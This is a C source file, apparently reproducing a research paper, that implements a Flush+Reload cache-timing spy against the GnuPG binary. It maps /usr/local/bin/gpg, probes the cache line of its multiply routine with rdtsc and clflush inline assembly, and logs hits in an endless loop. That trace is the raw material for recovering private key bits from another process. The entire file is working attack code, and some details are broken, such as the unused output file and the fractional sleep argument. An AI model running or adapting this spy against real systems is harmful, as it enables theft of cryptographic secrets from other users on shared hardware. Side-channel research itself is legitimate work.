#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdint.h>

#include "constants.h"

// original flush+reload code from the paper

int probe(char *adrs) {
    volatile unsigned long time;

    asm __volatile__ (
        "   mfence \n "
        "   lfence \n "
        "   rdtsc \n "
        "   lfence \n "
        "   movl %%eax, %%esi \n "
        "   movl (%1), %%eax \n "
        "   lfence \n "
        "   rdtsc \n "
        "   subl %%esi, %%eax \n "
        "   clflush 0(%1) \n "
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    
    return time < THRESHOLD;
}

int main() {
    const char *filepath = "/usr/local/bin/gpg";

    int fd = open(filepath, O_RDONLY);
    FILE* output = fopen("mul_output.txt", "w");


    if (fd < 0) {
        printf("Error opening GPG binary");
        return 0;
    }

    struct stat st;
    fstat(fd, &st);

    void *gpg = mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
    
    if (gpg == MAP_FAILED) {
        printf("mmap failed");
        close(fd);
        return 0;
    }

    char *mul = gpg + MUL;
    int timeslot = 0;

    while(1) {
        if (probe(mul)) {
            fprintf(stdout, "%d,mul,1\n", timeslot++);
        }
        // fprintf(stdout, "%d,mul,%d\n", timeslot++, probe(mul));
        sleep(0.625);
    }
}